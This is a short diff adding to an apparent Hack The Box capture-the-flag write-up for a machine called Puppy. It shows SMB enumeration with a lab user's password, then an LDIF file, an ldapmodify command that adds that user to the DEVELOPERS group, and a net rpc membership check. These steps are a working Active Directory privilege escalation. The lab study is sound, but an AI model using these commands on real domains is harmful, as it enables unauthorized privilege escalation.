@@ -42,3 +42,20 @@ smbmap -H 10.10.11.70 -u levi.james -p KingofAkron2025!
 IPC$
 NETLOGON
 SYSVOL
+
+
+add.ldif
+```
+dn: CN=DEVELOPERS,DC=PUPPY,DC=HTB
+changetype: modify
+add: member
+member: CN=LEVI B. JAMES,OU=MANPOWER,DC=PUPPY,DC=HTB
+```
+
+```
+ldapmodify -x -H ldap://10.10.11.70 -D "CN=LEVI B. JAMES,OU=MANPOWER,DC=puppy,DC=htb" -w 'KingofAkron2025!' -f add.ldif
+```
+
+```
+net rpc group members "DEVELOPERS" -U "levi.james" -S 10.10.11.70
+```
